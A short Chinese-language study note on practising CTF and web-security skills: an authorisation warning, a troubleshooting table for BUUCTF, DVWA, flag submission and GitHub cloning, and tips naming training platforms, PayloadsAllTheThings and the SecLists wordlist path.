> [!warn] 遵守平台规则，Vulnhub 靶机属授权环境，不要拿公共靶场做未授权扫描，更不要用靶场技术打未经授权的真实站点。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| BUUCTF 环境起不来 | 在线环境资源有限/排队 | 刷新或换时段；先做无需环境的题 |
| DVWA 打不开 | Docker 未启动或端口冲突 | `sudo systemctl start docker`；换端口 `-p 8080:80` |
| 提交 flag 显示错误 | 格式或大小写不对 | 按题目给的 flag{} 前缀，仔细对照抄 |
| GitHub clone 慢 | 网络问题 | 用镜像站或代理，SecLists 用稀疏检出 |
| WriteUp 看不懂 | 前置知识缺失 | 按题目标签回知识库对应条目补基础 |

#### 实战要点
- 刷题平台认准 BUUCTF + 攻防世界两个就够，别囤一堆账号。
- 本地靶场优先 DVWA 一个，漏洞类型全、有源码可读。
- PayloadsAllTheThings 是做题卡壳时的第一查询地，按漏洞类型直接翻。
- 字典就用 Kali 自带 SecLists，路径 `/usr/share/seclists`，不用自己攒。
- 平台题目环境和真实环境有差异，学会在本地复现题目的关键点。
